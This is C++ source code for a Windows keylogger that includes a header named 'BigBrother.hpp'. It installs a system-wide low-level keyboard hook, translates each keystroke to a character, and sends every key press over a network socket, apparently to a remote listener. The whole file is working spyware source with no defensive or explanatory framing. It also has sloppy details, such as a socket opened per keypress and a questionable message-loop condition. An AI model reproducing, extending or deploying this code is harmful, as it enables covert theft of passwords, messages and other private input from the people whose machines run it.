#include "BigBrother.hpp"


wchar_t VKCodeToUnicode(UINT vkCode)
{
    BYTE keyboardState[255]="";
    wchar_t buf[5] = L"";

    short x;
    byte y;

    for (int i = 0; i < 255; i++)
    {
      if (i == VK_CAPITAL)
      {
          x = GetKeyState(i);
      }
      else
      {
          x = GetAsyncKeyState(i);
      }
      y = 0;
      if ((x & 0x8000) != 0) y = (BYTE)(y | 0x80);
      if ((x & 0x0001) != 0) y = (BYTE)(y | 0x01);
      keyboardState[i] = y;
    }

    ToUnicodeEx(vkCode, MapVirtualKey(vkCode, 0), keyboardState, buf, 5, 0,
        GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr)));
    return buf[0];
}


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
            case WM_KEYDOWN:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            char c = VKCodeToUnicode(p->vkCode);
            SOCKET ConnectSocket = client();
            send(ConnectSocket, &c, 1, 0);
            break;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main()
{
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    if (hook == NULL) {
        cout << "failed to install keyboard hook" << endl;
        getchar();
        return 1;
    }

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
